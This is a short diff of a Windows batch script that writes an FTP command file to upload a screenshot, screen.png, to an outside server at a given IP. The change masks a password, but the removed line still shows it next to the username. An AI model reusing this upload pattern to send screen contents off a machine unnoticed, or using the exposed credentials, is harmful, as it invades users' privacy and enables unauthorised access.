@@ -10,7 +10,7 @@ move /-y screen.png %~sdp0
 choice /t %delay% /d y /n >nul
 echo open 60.205.30.49>>ftp.up
 echo bxu2359240250>>ftp.up
-echo lj011200>>ftp.up
+echo ******>>ftp.up
 echo bin>>ftp.up
 echo cd /htdocs/>>ftp.up
 echo put "screen.png">>ftp.up
